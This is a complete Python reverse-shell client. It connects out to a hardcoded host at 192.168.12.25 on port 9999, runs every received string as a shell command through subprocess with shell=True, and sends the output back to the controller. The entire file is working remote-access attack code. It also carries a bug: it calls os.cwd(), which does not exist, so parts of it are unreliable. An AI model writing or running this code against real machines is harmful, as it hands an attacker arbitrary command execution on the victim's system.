#!/usr/bin/env python
import socket, os, subprocess

def main():
	
	#declarations
	cSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	host = '192.168.12.25'
	port = 9999

	#bind ((tuple))
	cSocket.connect((host, port))

	#persistence
	while True:
		
		#receive information from the server
		data = cSocket.recv(1024)
		
		#handle 'cd' command (if first two chars are cd, change dir to whats after 3rd char)
		if data[:2].decode("utf-8") == 'cd':

			os.chdir(data[3:].decode("utf-8"))

		#handle no command sent
		if len(data) > 0:
	
			#handle any length of data as a command- store in variable cmd
			#for input, output and error handling
			cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)

			#concatenate output and errors- store in output_byte var
			#and convert to string
			output_byte = cmd.stdout.read() + cmd.stderr.read()
			output_str = str(output_byte, "utf-8")

			#format current working dir with gt symbol
			currentWD = os.cwd() + "> "

			#encode and send the output back to the server
			cSocket.send(str.encode(output_str + currentWD))
		
			#print the output to the client machine
			print(output_str)

if __name__ == '__main__':
	main()
